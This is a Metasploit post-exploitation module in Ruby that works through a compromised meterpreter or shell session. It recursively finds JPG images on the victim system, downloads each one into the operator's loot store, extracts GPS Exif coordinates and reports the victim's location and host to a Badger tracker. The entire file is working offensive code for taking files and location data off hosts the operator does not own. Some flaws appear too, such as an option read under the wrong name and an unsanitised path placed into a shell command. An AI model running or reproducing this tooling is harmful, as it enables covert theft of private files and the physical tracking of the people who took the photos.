require 'msf/core'
require 'msf/core/post/file'
require 'rex'
require 'yaml'
require 'exifr'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Badger_Report
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'		=> 'JPG GPS Exif Tag Finder (Badger)',
			'Description'	=> %q{
			This module can be used to search through a system for JPG images
			containing GPS Exif Tags.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt'],

				'Platform'      => [ 'unix', 'bsd', 'linux', 'osx', 'windows'],
				'SessionTypes'  => [ 'meterpreter', 'shell' ]
			))

		register_options([OptString.new('PATH', [true, 'Directory to search', nil])],
			self.class)
	end

	def gps_check(file,fullpath)
		a=EXIFR::JPEG.new("#{file}")
		gps_found = false

		if a.exif?
			h = a.exif.to_hash
			h.each_pair do |k,v|
				if k.to_s == "gps_longitude"
					gps_found = true
				end
			end
		end
		
		if gps_found
            
            # convert to lat/lon based on n/s & e/w
			lat = a.exif[0].gps_latitude[0].to_f + (a.exif[0].gps_latitude[1].to_f / 60) + (a.exif[0].gps_latitude[2].to_f / 3600)
			lon = a.exif[0].gps_longitude[0].to_f + (a.exif[0].gps_longitude[1].to_f / 60) + (a.exif[0].gps_longitude[2].to_f / 3600)
            
            lon = lon * -1 if a.exif[0].gps_longitude_ref == "W"
            lat = lat * -1 if a.exif[0].gps_latitude_ref == "S"
            

			acc=1.0
			print_status("#{fullpath} contains GPS Exif Data, Lat=#{lat}, Lon=#{lon}")
			pos = Position.new(lat,lon,acc)            
			comment = "File: #{fullpath} @ Host: #{session.session_host}"
			enc_comment = Rex::Text.encode_base64(comment)           
			report_cresults(pos,"msf_exiffind",enc_comment)
		end
	end
	
	def loot_jpg(jpg)        
		if session.type == "meterpreter"
			sep = session.fs.file.separator
		else
			sep = "/"
		end

		print_good("Downloading #{jpg} to loot database")
		data = read_file("#{jpg}")
		file = jpg.split(sep).last
		loot_path = store_loot("jpg.#{file}", "image/jpeg", session, data,
			"jpg_#{file}", "JPG #{file} File")
		return loot_path
	end
	
	def check_jpgs(jpgs)
		jpgs.each do |jpg|
			loot_path=loot_jpg(jpg)
			gps_check(loot_path,jpg)
		end
	end

	def nix_shell_search
		jpgs = []
		cmd="find #{datastore['path']}/ -iname \"*.jpg\" -type f -print 2>/dev/null"
		res = session.shell_command(cmd)
		res.each_line do |filename|
			begin
				jpgs << filename.rstrip
			end
		end
		return jpgs
	end
	
	def meterp_search
		jpgs = []
		res = session.fs.file.search(datastore['PATH'], "*.jpg", true, -1)
		res.each do |filename|
			begin
				print_status("Found File #{filename}")
				jpgs << filename.rstrip
			end
		end
		return jpgs
	end
	
	def met_scan(path)
        print_status("Scanning #{path} recursively for JPG images")
        jpgs=[]
		client.fs.dir.foreach(path) {|x|
			next if x =~ /^(\.|\.\.)$/
			fullpath = path + '\\' + x
			if client.fs.file.stat(fullpath).directory?
				jpgs << met_scan(fullpath)
			elsif fullpath =~ /\.jpg/i
				jpgs << fullpath.rstrip
                print_good("Found image: #{fullpath.rstrip}")
			end
		}
		return jpgs
	end
	
	def session_has_search_ext
		begin
			return !!(session.fs and session.fs.file)
		rescue NoMethodError
			return false
		end
	end

	def run
		if session_has_search_ext
			jpgs = met_scan(datastore['PATH'])
		elsif session.platform =~ /unix|linux|bsd|osx/
			jpgs = nix_shell_search
		end

		check_jpgs(jpgs)
	end

end
